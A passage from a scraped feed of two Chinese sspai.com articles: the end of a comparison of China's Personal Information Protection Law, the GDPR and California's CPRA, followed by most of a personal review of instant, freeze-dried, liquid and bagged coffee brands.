的管辖范围非常宽泛，遵循「属地」（即根据个人信息处理行为的发生地判断）加「属人」（即根据个人信息处理主体的注册地判断）的管辖原则，管辖范围广泛、逻辑复杂，一路延伸到境内实体在境外的个人信息处理行为。</p>\n<p>个保法对境外数据处理者的管辖较为明确，采取的是「属地」原则为主，例外情形为辅的方法。而 CPRA 的范围最窄，主要聚焦于「属地」原则，仅管辖在加州开展的商业活动，并设置了一定的管辖门槛使符合条件的中小企业的经营活动可以豁免管辖。</p>\n<h2>处理原则：同意在先，还是选择在后？</h2>\n<p>在个人信息的保护中，一个非常重要的议题就是尊重用户的选择权——用户有权决定自己的个人信息能否被处理、以什么方式被处理。相应地，三部法律都对于个人信息处理的原则作出了规定。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/24d4e3a4d1f9bbd4e7bd84fdf1823cdd\"></figure><p>其中，GDPR 和个保法比较类似，都构建了以<strong>「告知—同意」</strong>为核心的处理原则，信息主体（用户）的同意是企业处理数据时最重要的合法性基础，且有权随时撤回同意。</p>\n<p>而美国的 CPRA 采取<strong>「选择退出」</strong>机制，除非消费者选择拒绝出售或共享数据，一般默认消费者同意数据的处理。但是在特定情形下，处理个人信息也需要取得个体的同意。</p>\n<p>除此之外，三部法律还反映出一些共同原则：</p>\n<ul>\n<li>三部法律都规定了<strong>目的原则</strong>和<strong>最小必要原则</strong>来限制个人信息的收集与处理，以此达到更好保护个人信息的效果。换言之，即使获得了同意，如果其对信息的处理不符合法律限定的目的，或者超出了实现这种目的最小必要的范围，同样也是违法的。</li>\n<li>三部法律都认可，有效的同意应当由用户<strong>充分知情</strong>且<strong>自愿、明确</strong>地作出。CPRA 更是排除了部分互联网场景下的具体情形，强调消费者接受通用条款或悬停、静音、暂停、关闭等行为都不构成同意，暗箱操作模式也会导致获得的同意无效。</li>\n<li>三部法律都对<strong>处理儿童个人信息</strong>时须取得的同意做了特别规定，要求处理低于特定年龄的儿童个人信息时取得监护人同意。其中，GDPR 以 16 周岁为界，中国以 14 周岁为界，CPRA 则区分了13周岁和16周岁两种情况。</li>\n</ul>\n<h2>处理主体及其义务：该管谁、怎么管</h2>\n<p>界定了个人信息，明确了处理原则，接下来就该对处理个人信息的主体做出具体规定了。但这同样不是一个简单的问题：随着互联网商业模式的日益复杂，同一则个人信息可能在不同公司之间多次易手，法律到底应该管到什么范围呢？在个人信息处理中扮演不同角色的公司，是否需要区别对待呢？</p>\n<p>在这个问题上，个保法形成了「个人—个人信息处理者」两方主体关系， GDPR 则进一步细化，形成了「个人—数据控制者—数据处理者」的三方主体关系。</p>\n<p>这里需要注意，GDPR 的「处理者」仅仅表示代表「控制者」处理个人信息的主体，「控制者」则指的是决定个人信息处理目的和方式的主体。其中，数据控制者是 GDPR 下履行义务的主要主体，数据处理者主要根据与数据控制者之间的合同义务行事，GDPR 下的法定义务则相对少一些。相反，我国个保法则没有区分处理者与控制者，而是统称为「个人信息处理者」，两者都要遵守个保法下的各项义务。</p>\n<p>CPRA 则采用了另一套分类方法，区分了「企业」、「服务提供商」和「承包商」三类主体。其中，「企业」的定义接近 GDPR 的「数据控制者」，其限定于在加州开展业务的营利组织，且需要在上一年度总收入、处理的个人信息数量及个人信息处理与收入的联系上满足一定的门槛。符合条件企业所控制的实体、合营企业及其他自愿受约束的主体也被囊括在「企业」的范围之内。实际上，只有「企业」承担 CPRA 下的义务；至于「服务提供商」和「承包商」，则只需根据其与「企业」的合同行事，不直接受 CPRA 约束。</p>\n<p>上述不同主体区分方式以及相应义务如下图所示：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/73c7e6577dc241aecd7472edd6974976\"></figure><p>比较而言，欧盟 GDPR 与美国 CPRA 区分角色的行为能够细化各个主体的义务与责任，更加有利于产业的发展和保护；而我国个保法统一定义为「个人信息处理者」的模式则更加有助于个人信息的保护。</p>\n<p>此外，在主体区分问题上，各法规还体现出一些特色：</p>\n<ul>\n<li>个保法制定了针对<strong>重要互联网平台</strong>的特殊义务，这与欧盟《数字市场法案》（Digital Market Act）提案中对于「守门人」数据保护义务的规定相似。</li>\n<li>GDPR 和个保法均对<strong>小型企业</strong>进行特别规定。具体而言，GDRP 对于员工少于 250 人的组织放宽了记录保存的相关规定，并鼓励充分考虑微型、小型和中型企业的特殊需求。个保法则规定，将针对「小型个人信息处理者」制定专门的个人信息保护规则、标准，但定义仍有待明确，相应的规则、标准也有待后续制定。</li>\n</ul>\n<h2>信息主体的权利：框架相似，详略不同</h2>\n<p>与义务相对的是权利。在之前的文章中，我们已经介绍过个保法赋予信息主体的权利，包括知情权、更正权、限制权、删除权、拒绝权、数据可携权等；这些权利在 GDPR 和 CPRA 中也都有类似的表述。</p>\n<p>不过，值得指出，个保法对权利的规定是较为简略，以列举权利名称为主，具体内涵则暂未进一步解释；而 GDPR 和 CPRA 对每种权利都进行了细致规定。</p>\n<p>此外，较有特色的是，CPRA 规定了拒绝后不受报复的权利，中国个保法规定了死者近亲属对死者个人信息拥有的权利。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/d357f5a75a948552aa8d8eab7a40f98b\"></figure><p>我们在介绍个保法时还讨论过「大数据杀熟」的现象和个保法的相应规定。实际上，这类「自动化决策」问题在全世界都是备受关注的。自动化决策的决策逻辑依托算法等技术，在外界看来具有不透明性，是难以监督的「黑箱」。因此，不论是从企业合规的角度还是政府监管的角度，对这种处理行为的监管都存在着比较大的挑战。</p>\n<p>在这样的背景下，个保法之外的两部法律也都对自动化决策作出了规定，也是情理之中的。总结起来，三部法律均关注到了自动化决策中对个人信息的保护问题，总体上都要求<strong>决策逻辑需透明，决策结果需公平公正，且需保证用户拥有拒绝权</strong>。其中，GDPR 和个保法对用户的拒绝权和处理者的义务做出了一些较为具体的规定，而 CPRA 目前只预留了一个监管空间，将具体合规要求留待后续进一步法令。值得注意的是，我国个保法还规定，不得利用自动化决策进行差别待遇。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/92aac2aff4c72403c35bfb524de703e9\"></figure><h2>个人信息跨境传输：「白名单」与「提条件」</h2>\n<p>规范数据的跨境传输是目前全球普遍的立法趋势。个人信息是一种重要的数据类型，对此，欧盟和中国都对其跨境传输进行了限制。我们此前已经对我国的管理方式做出过介绍，这里再与 GDPR 做一比较。（CPRA 是州层面的立法，不涉及个人信息的跨国传输。）</p>\n<p>首先，个保法和 GDPR 的共同之处在于，对于个人信息跨境传输的<strong>限制是单向的</strong>，即只监管个人信息的流出，而不监管个人信息的流入。</p>\n<p>但两部法律的区别在于，GDPR 采取了一种类似「白名单」的方式，个保法则规定了向境外传输的具体条件。</p>\n<p>具体而言，GDPR 首先规定了一个「充分保护水平认定」的名单，向名单上的国家、地区或组织转移数据的，不需要采取特别的保障措施。如果不在名单上，则需要根据 GDPR 的规定，采取适当的保障措施才能够进行个人信息的跨境转移。</p>\n<p>除了上述两种基本规则外，GDPR还规定了两个特殊规则：一是在存在有效国际协议的情况下，可以基于司法判决、行政决定等进行跨境传输；二是在满足特定的条件后，即使缺乏充分保护认定以及适当的保障措施，也可以进行跨境转移。</p>\n<p>至于个保法，如之前文章所述，其规定满足下列四个条件之一的，方可以向境外转移：</p>\n<ul>\n<li>通过网信部门组织的安全评估；</li>\n<li>按照网信部门的规定经专业机构进行个人信息保护认证；</li>\n<li>按照网信部门制定的标准合同与境外接收方订立合同，约定双方的权利和义务；</li>\n<li>法律、行政法规或者国家网信部门规定的其他条件。</li>\n</ul>\n<p>此外，个保法对涉及一些特殊处理者、接收方的跨境传输提出了专门要求。例如，「关键基础设施」运营者存储于境内的个人信息，确需向境外提供的，必须通过国家网信部门组织的安全评估；境外的司法或者执法机构要求提供存储于境内的个人信息的，应当经主管机关批准等。</p>\n<h2>法律救济与法律责任：公益诉讼助维权，高额罚款是趋势</h2>\n<p>权利和义务都要通过责任来保障。对此，三部法律都规定了侵犯个人信息利益的行为，个人有权提起诉讼，而违法主体要承担罚款等后果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/05/article/9a138b3b4036fcd399736a12cc74a856\"></figure><p>从上图可见，关于救济方式，个保法和 GDPR 在消费者提起民事诉讼的权利基础上，还规定相关组织（个保法规定还包括检察机关）可以就个人信息侵权行为提起<strong>公益诉讼</strong>，增强了消费者提起诉讼的权利。而 CPRA 则规定，消费者提起诉讼后，企业有 30 天纠错期，期间企业纠正行为并声明后，消费者不得提起诉讼，这则对消费者提起诉讼的权利进行了限制，增强了对企业的保护。</p>\n<p>关于法律责任，GDPR、个保法以及 CPRA 都对违法个人信息保护的行为规定了罚款。就罚款额度而言， GDPR 的额度最高，处罚最严厉；个保法次之，而且其规定了多种处罚类型，且采取了双罚制的规定，企业与直接主管人员都要为不当信息处理行为负责。美国 CPRA 规定的罚金数额则比较低，且规定将把罚款存入消费者隐私基金。</p>\n","link":"https://sspai.com/post/69116"},{"title":"尝试了几十种速溶咖啡后，想和你聊聊移动咖啡馆","date":"2021-10-07 03:21:49","description":"\n<p>我离不开咖啡，是那种从肉体到精神层面的都离不开，每天早上用第一杯咖啡开启高效工作是做作的奉承，但每天早上嘬下的第一口拿铁是疲惫生活里最强的一针肾上腺素是我对咖啡最恰如其分的赞歌。</p>\n<p>一直以来我对咖啡的要求介于随性和苛刻之间，随性是指我不太纠结豆子的烘焙、产地甚至新鲜程度，我可以在电商购物节里在销量排名最高的店铺一次性买上十数包豆子扔柜子里慢慢喝，同样的研磨度和萃取时间因为新鲜度流失无论出来的咖啡液是标准的 36g 还是稀稀拉拉的 60g 我都能微笑又满足的一饮而尽；但我讨厌速溶咖啡，讨厌到尽管曾经只喝过雀巢三合一，朋友非要让我试试并给了我一颗三顿半我能在咖啡机旁摆一年也不愿意尝试一下被聊得热热闹闹的冻干到底是啥滋味。</p>\n<p>我能隐隐喝出精品咖啡店里手冲小卡片上的前中后味，但我依然更喜欢中深烘焙豆子流出的黝黑 shot，再配上蛋白质含量越高的牛奶对我来说就是越好喝的咖啡。</p>\n<p>所以当我说「我喜欢喝咖啡」的时候，并不代表我是一个精致的咖啡猎人，咖啡于我就是一种附赠感性愉悦的功能性饮料，只要它能让我虎躯一震，并且香醇入口，那么它就是一杯好咖啡——我想和我这样的普通咖啡成瘾者应该很多，所以这次作为一个尝试了数十种不同技术和口味的速溶新人，我想就像平日里喝咖啡那样，只要快乐和好喝，不谈虚头巴脑的这那那这，看看如果没有咖啡机，我们到底能不能喝上一杯好咖啡。</p>\n<h2>我都试了哪些咖啡</h2>\n<p>最早在了解现在主流热门的速溶咖啡时，看到很多人说「可不要拿雀巢那种垃圾速溶和我们冻干、挂耳比」，所以我也有那么一阵恍惚「速溶咖啡特指雀巢三合一」，但后面想了想，「速溶」的对立面应该是「讲究」——你要花钱买咖啡机、买磨豆机、要了解选配最好口味的豆子、要苛求研磨度、萃取时间和和压力、要打出细腻绵密的奶泡、还要能拉出独角兽。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/2f56e381a6aa2fb6cbbe3311e44b2ce7.jpg\"></figure><p>所以反推并强调——全文我所提及的速溶是只需要杯子和水（包含冷热水和冷热奶）就能做出来的咖啡，至于雀巢还是三顿半永璞明谦，它们都在同一个起跑线上，只是售价和加工技术的不同。</p>\n<p>我先列举一下在撰写本文前我都尝试过的咖啡：</p>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td><strong>品牌</strong></td>\n<td><strong>型号</strong></td>\n<td><strong>类别（储存条件）</strong></td>\n<td><strong>包装（数量*单件重量）</strong></td>\n<td><strong>单价（人民币）</strong></td>\n<td><strong>冲泡条件</strong></td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"3\">\n<p>明谦</p>\n<p> </p>\n</td>\n<td>嘿可可</td>\n<td>袋泡</td>\n<td>15*10g</td>\n<td>4</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>冰滴咖啡黄金曼特宁、耶加雪菲</td>\n<td>咖啡液（冷藏）</td>\n<td>10*30ml</td>\n<td>4.27</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>超精品即溶黄金曼特宁、耶加雪菲</td>\n<td>冻干</td>\n<td>10*2g</td>\n<td>4.45</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"6\">\n<p>科林</p>\n<p> </p>\n</td>\n<td>数字挂耳 5 号</td>\n<td>挂耳</td>\n<td>20*12g</td>\n<td>3.6</td>\n<td>热水</td>\n</tr>\n<tr>\n<td>硬盒超即溶混合装</td>\n<td>冻干</td>\n<td>12*3g</td>\n<td>7.42</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>热泡拿铁</td>\n<td>袋泡</td>\n<td>20*10g</td>\n<td>3.45</td>\n<td>热水</td>\n</tr>\n<tr>\n<td>冰酿奶萃</td>\n<td>袋泡</td>\n<td>20*10g</td>\n<td>3.45</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>速溶纯黑咖啡粉</td>\n<td>高温干燥咖啡粉</td>\n<td>227g</td>\n<td>0.32（按照官方冲泡要求 126 杯计算）</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>小萌蛋多彩装</td>\n<td>咖啡液（常温）</td>\n<td>12*18g</td>\n<td>4.92</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>\n<p>UCC</p>\n<p> </p>\n</td>\n<td>职人咖啡</td>\n<td>高温干燥咖啡粉</td>\n<td>90g</td>\n<td>1.31（按照官方冲泡要求 45 杯计算）</td>\n<td>热水</td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"2\">瑞幸</td>\n<td>花漾特调</td>\n<td>冻干</td>\n<td>12*3g</td>\n<td>7.93</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>元气弹</td>\n<td>冻干</td>\n<td>18*2g</td>\n<td>5.5</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"2\">雀巢</td>\n<td>馆藏拿铁</td>\n<td>三合一</td>\n<td>20*19</td>\n<td>3.33</td>\n<td>热水</td>\n</tr>\n<tr>\n<td>金牌空气咖啡</td>\n<td>冻干</td>\n<td>50g</td>\n<td>2.36（按照官方冲泡要求 25 杯计算）</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>企鹅市集</td>\n<td>冷萃咖啡液</td>\n<td>咖啡液（冷藏）</td>\n<td>10*30ml</td>\n<td>6.9</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"4\">三顿半</td>\n<td>手冲滤挂式咖啡粉深度烘焙</td>\n<td>挂耳</td>\n<td>10*10g</td>\n<td>5.9</td>\n<td>热水</td>\n</tr>\n<tr>\n<td>冷萃滤泡咖啡拿铁拼配</td>\n<td>袋泡咖啡</td>\n<td>10*12g</td>\n<td>6.9</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>茶粉混合装</td>\n<td>冻干</td>\n<td>18*1g</td>\n<td>4.94</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>精品速溶冻干</td>\n<td>冻干</td>\n<td>18*2g</td>\n<td>4.94</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td colspan=\"1\" rowspan=\"5\">永璞</td>\n<td>闪萃即溶咖啡液黑咖啡、榛果咖啡、柚子咖啡</td>\n<td>咖啡液</td>\n<td>7*25g</td>\n<td>8.05</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>乌龙咖啡</td>\n<td>冻干</td>\n<td>12*2.2g</td>\n<td>8.25</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>冷萃咖啡液经典、埃塞俄比亚、云南石端正、云南紫叶云澜、云南皓月旷野</td>\n<td>咖啡液</td>\n<td>10*22ml</td>\n<td>4.58</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>冷萃飞碟冻干</td>\n<td>冻干</td>\n<td>12*2.8g</td>\n<td>8.25</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>闪萃茶液</td>\n<td>茶液</td>\n<td>7*25</td>\n<td>8.05</td>\n<td>（冷热均可）水、奶</td>\n</tr>\n<tr>\n<td>AGF</td>\n<td>MAXIM 黑咖啡</td>\n<td>高温干燥咖啡粉</td>\n<td>20*2g</td>\n<td>2.4</td>\n<td>热水</td>\n</tr>\n</tbody></table></figure><p>以上这些是我在咨询了一些常喝速溶咖啡的作者和朋友后下单的，另外我也对比了一下「速溶咖啡」、「冻干」和「咖啡液」等关键词下的销量排序，它们几乎也都是目前速溶咖啡界的「顶流」，所以我将从它们开始自己的速溶咖啡新世界。</p>\n<h2>速溶咖啡的技术与升级</h2>\n<p>想必很多人和我一样都是在小时候从雀巢知道咖啡，再从星巴克明白什么是咖啡与速溶咖啡，但其实速溶咖啡的历史远比我们想象中的久远。</p>\n<p>早在一百三十多年前新西兰人 David Strang 便发明并登记了咖啡粉的专利，而后经过数次改良最终由雀巢以喷雾干燥技术正式风靡世界并沿用至今。这种技术简单来说就是利用高温热气喷射咖啡萃取液使其水分蒸发，最后形成可溶于水的咖啡粉，但凡事有利有弊，相比正常手磨咖啡粉制作出来的咖啡，这种速溶咖啡粉在高温下已经失去了咖啡特有的芳香物质，你喝到的就成了一杯毫无生命力的苦水。</p>\n<p>但雀巢厉害的是想到了给咖啡「调味」，不仅在前期咖啡粉制作过程中添加可溶性碳水化合物增加咖啡香气，还「买一赠一」附上了声名远扬的「咖啡伴侣」，甚至之后直接奶精香精三合一的便携包。这一举动虽仍然被咖啡爱好者诟病「咖啡之耻」，但意外的是被许多之前接受不了咖啡苦涩味的路人所喜爱，成了一杯好喝又提神的「快乐水」。</p>\n<p>在确定这个选题之前以上便是我对速溶咖啡的所有认知，而因为这种工业化生产的速溶咖啡通常使用品质低劣的咖啡豆，同时我又非常喜欢咖啡中独特醇厚的酸苦滋味，所以可想而知我一直以来有多么嫌弃速溶咖啡。</p>\n<p>但现代新技术下的速溶咖啡着实让我再一次重新认识了速溶咖啡。</p>\n<h3>冻干速溶</h3>\n<p>「冻干咖啡」应该是目前口味最丰富也最受欢迎的速溶咖啡品类了，从技术上来讲，我认为它当算是对传统高温速溶法的一种升级。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ahhe5b34teh0gc1cag.jpeg\"><figcaption>永璞冻干工艺宣传图</figcaption></figure><p>我们知道水有三种形态——液体、固体和气体，在不同的温度和压力下它们之间能够互相转换，传统的速溶工艺是通过高温让咖啡萃取液中的水分蒸发，而冻干咖啡同样运用了水的升华特性，不同的是它是在真空低温的环境下使其升华留下易溶于水的咖啡粉。相比高温升华，冻干技术能更好的保留住咖啡原本的香气，最后也就不再只是喝下一杯「苦水」，而是尽可能还原其本质的咖啡。</p>\n<p>可冻干工艺说起来简单，它背后需要付诸的是高温工艺远不能比的生产（机器）成本，同时因为可以最大程度还原咖啡本身的香气，所以冻干技术原则上就需要使用更高品质的咖啡豆。最后得到的结果是前文表格中最高近 ¥8/杯的科林超即溶，它已经超过了我日常搭配咖啡机使用咖啡豆的成本，但成品肯定不能相提并论。</p>\n<p>不过这种说法并不准确，咖啡机本身的价值和耗时都是一杯咖啡的成本，而冻干只需要一个杯子和任意温度液体就可以出品的特性也是它价值的一部分。回过头来看我总是若有似无的强调价值或许是因为「速溶咖啡就等于劣质廉价咖啡」的刻板印象，但我想这个观念或许应该稍以改变。</p>\n<h3>速溶咖啡液</h3>\n<p>其实尝试之前我对速溶咖啡液的期待是最大的，因为无论高温低温升华获取速溶咖啡粉都会有芬芳物质流失，那如果是直接咖啡液封装应该就能获得最本味的还原了；对于冻干我更多是「可能就好一点点」的平平期待。</p>\n<p>可实际体验后的结果是我应该不会再继续购买咖啡液了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c5ahhedb34teit0pmp8g.jpeg\"><figcaption>永璞咖啡液制取流程</figcaption></figure><p>目前市售的咖啡液大多数为高温煮制和低温冷萃，简单来说就是我们在咖啡店里买到的浓缩版美式或冷萃咖啡，也有少部分例如科林的「小萌蛋」是用 129℃ 纯净水经 0.05s 的 500Kpa 高压萃取获得，再极速冷却、杀菌并封装。从口感上来讲低温冷萃的咖啡液更注重咖啡豆的风味还原，所以你能喝到它所标识的诸如坚果、柑橘和莓果等不同风味；而高温煮制的咖啡液苦感更浓，更像是一杯传统认知里的咖啡。</p>\n<p>但它们都有一个我认为致命的缺点，就是太淡——当然这是一个极其主观的评价，我一向喜欢咖啡特有的苦涩风味，印象中在东南亚喝过的特有的带烟熏味的咖啡是我感官愉悦的巅峰，我几乎不会主动去尝试精品咖啡店里的各种特色手冲，因为很难静下心来去品尝那些细微的复合滋味，就喜欢浓郁厚重醇香热烈的的苦涩咖啡。</p>\n<p>所以如果你平日里喜欢美式或者寻觅各种精品手冲，那么可能咖啡液更适合你；反之如果你和我这般永远的拿铁、Dirty 和馥芮白，那么或许冻干更适合你。值得一提的事，在此我仅讨论的是口味，但我个人的感受是咖啡液的咖啡因含量是略高于冻干咖啡的。</p>\n<p>值得一提的是目前市售的咖啡液通常分为冷藏和常温保存两种方式，并且前者保质期相对较短（通常在三个月左右），后者甚至能超过一年。从工艺上来讲，需冷藏保存的咖啡液通常是萃取后直接冷却封装，常温长期保存的则是在萃取后经过了高温杀菌再封装。从口味上来讲，前者保留了更多咖啡风味，更适合用来制作冰美式或者苏打水、鸡尾酒特调等需要体会咖啡复合风味的饮品，后者则有着更浓郁的苦涩滋味（非贬义），甚至还有大部分直接调配好的榛果、柚子等口味拿铁，可以直接淋入牛奶饮用，所以如果你和我这般大部分时候都是奶咖为主，那么选择常温保存的咖啡液即可。</p>\n<h3>挂耳与袋泡咖啡</h3>\n<p>在冻干和咖啡液风靡之前，挂耳咖啡应该是速溶咖啡界鄙视链的顶端，代表着即使是不方便喝新鲜咖啡但也绝不将就的骄傲。</p>\n<p>从某种程度来讲，挂耳咖啡其实就是精品店里手冲咖啡的另一种形态，如果你能掌握好水温和冲泡手艺，依然能得到一杯毫不逊色的精品咖啡，区别只在于店里通常是现磨咖啡豆冲泡，拥有完整的咖啡风味，而研磨后包装出售的挂耳咖啡总归是不断在流失新鲜度。所以如果你是手冲爱好者并且对挂耳咖啡感兴趣，非常推荐尝试，并且建议少量多次购买，尽可能都品尝最新鲜封装的挂耳咖啡。如果想要了解更多挂耳咖啡的知识，<a href=\"https://sspai.com/post/65645\" target=\"_blank\">非常推荐阅读这篇文章。</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/f74b4a7a658c7db1ddaae7734fa54c00.jpg\"></figure><p>现在我想重点讲讲袋泡咖啡。其实在挂耳咖啡风靡之时，我就想着为什么没有类似于茶包那样的袋泡咖啡，方便快捷，没想到真的在这次筹备内容的时候喜闻乐见了许多袋泡咖啡产品。</p>\n<p>其实袋泡咖啡本质上和挂耳咖啡类似，都是用滤袋封装新鲜研磨的咖啡粉出售，所以在购买时依然建议遵循「少量多次」的购买思路，不要迷信它的保质期，尽可能买最新鲜日期的产品并尽快饮用。另外我们有必要知道一个咖啡的特性，就是咖啡粉可溶于水的风味物质不全都是我们喜欢的，如果是热水浸泡的话最好在 5min 左右浸泡后立马丢弃，切不可像茶叶那般长时间甚至反复热泡，这样你真的会收获一杯刷锅水。</p>\n<p>袋泡咖啡是我在尝试了这几种形态的速溶咖啡后最意外的一种，用它做出来的冰拿铁非常入味丝滑，唯一美中不足的就是需要提前放在冰箱里冷藏八小时略嫌麻烦，但是是值得的。</p>\n<h2>那些值得买的速溶咖啡</h2>\n<p>说了这么多，主要是想要让大家对不同种类的速溶咖啡有个了解，不同生产技术封装的速溶咖啡不仅呈现的风味不同，也和你日常的咖啡选择有关，简单总结来说：</p>\n<ol>\n<li>如果你喜欢美式这样的纯咖啡，推荐速溶咖啡液，并且最好是冷藏保存的冷萃咖啡液，你可以放心跟着包装上标识的风味选购，最后成品几乎一致；</li>\n<li>如果你喜欢冰奶咖，并且时间充裕，可以选择袋泡咖啡，但需要注意冷藏时间最好控制在不多不少八小时，少了风味析出不足，多了可能就会变成刷锅水；</li>\n<li>冻干咖啡是一个不会出错的选择，无论是冷热冲泡美式或者奶咖，都能获得不错的体验，并且调制方便，值得一提的是现在大部分冻干咖啡粉都会标识适合美式或者奶咖，可以参照这个购买；</li>\n<li>挂耳咖啡见仁见智，它是「精品手冲爱好者不可抗力条件下的解决方案」，同时如果想要获得一杯好喝的挂耳还需要一定程度的冲泡技巧，不建议新手直接冲；</li>\n<li>永远不要买雀巢。</li>\n</ol>\n<p>而我作为冰奶咖爱好者，给你推荐几款一定要尝试的速溶咖啡。</p>\n<h3>明谦「超精品即溶咖啡#黄金曼特宁」，风味被还原得丰富又浓郁</h3>\n<p>冻干咖啡有一个致命的缺点就是它在干燥过程中总是会有风味流失，但明谦的这款「超精品即溶咖啡」却非常完美的还原了咖啡的复合风味。按照官方的描述，「采用了 A-R 香气还原技术，在咖啡还呈现液体时将香气统一收集，在冻干后再进行重置还原」，我反复搜索了相关信息也没有找到更详细的介绍，如果有了解的朋友也非常感激补充。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/6f95c7cf282c1db4a47ee87a8163d6eb.jpg\"></figure><p>从口味上来讲，它的确能尝到官方标识的「黑巧风味」，但如果只是这样就没啥可说的了，非常惊人的是它还能尝到一种很浓郁的醇厚香气，这种香气不是一种具体的味道例如常见的坚果莓果蜂蜜等，它就是咖啡本身的香气。怎么说呢，就像用猪油炒的蒜蓉菜心、大铁锅做出来的炖肉和满山跑老母鸡熬出来的鸡高汤，就像我们常说速溶咖啡是没有灵魂的，而这股香气给速溶咖啡带来了灵魂。</p>\n<p>这款咖啡有两种口味，分别是「黄金曼特宁」和「耶加雪菲」，前者适合奶咖后者更宜黑咖，如果你想要尝试冻干，它必须第一个被下单。</p>\n<h3>明谦「袋泡咖啡#嘿可可」，牛奶咖啡相亲相爱一家人</h3>\n<p>作为一个奶咖爱好者，如果是冰饮相比冰拿铁我更喜欢 Dirty，因为我默认咖啡与牛奶是没有那么容易融合在一起的。大多数时候喝冰拿铁都是从淡到淡，越喝越淡，所以还不如像 Dirty 那般直接大口咖啡包裹着冰润奶香三十秒一饮而尽。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/b89c2a094158c42f5771ad61047ef923.jpg\"></figure><p>但这款袋泡咖啡是真的让我第一次强烈体会到「冰奶咖」的魅力，经过八小时的冷泡奶香与咖啡香非常巧妙地融合在了一起，从第一口到最后一口都是同样的快乐，而且入口丝滑。对比同时购买的其它几款袋泡，他们要么就是析出的咖啡香气不足，要么就是过萃（按照官方建议时间）析出了很多糟糕风味虽不至于刷锅水但的确不是讨喜的成品。</p>\n<p>其实我花了不少时间纠结它和前一款冻干的推荐顺序，因为从口味来讲我更喜欢这款袋泡咖啡，最后想想八小时的冷萃条件似乎已经超出了「速溶咖啡」的特点——你不能随时随地想喝就喝。但相反的，即便你和我一样有完善的新鲜咖啡萃取条件，我也非常建议你购买尝试，在某个决心就待屋里啥也不干的周末提前准备好，给宅家的快乐加倍。</p>\n<h3>永璞「6.0 冷萃咖啡液#红色石端正庄园」</h3>\n<p>原则上我是不太喜欢咖啡液的，因为它的风味太丰富了。如果是冷萃咖啡液，在咖啡本身的风味之余会尝到一些奇奇怪怪的酸涩感，虽然可以理解为速溶咖啡的缺陷，但若是没有这个借口，放在新鲜咖啡上那完全就是一杯变质了的坏咖啡；而经过高温灭菌封装后可以常温冷藏的咖啡液虽然大部分烦杂风味被浓烈的咖啡苦涩隐藏，但与之相伴的是一种淡淡的橡胶味儿。总之在我购买的这些款咖啡液里，没有一款是让我满意想着以后再来一次的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/19159c615a988afd3a30c0f957db2e33.jpg\"></figure><p>但我也能理解读着此文的你是满脑袋不信的，所以我从中挑选了三款稍微那么适口的咖啡液分享给你，分别是来自永璞的「6.0 冷萃咖啡液#红色石端正庄园」、明谦的「冰滴咖啡液#黄金曼特宁」和企鹅的「冰滴鲜萃黑咖啡#中烘焙」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/e5a94f425acc1dd25440bbdd221d0161.jpg\"></figure><p>其中我建议一定要尝试的是永璞的「6.0 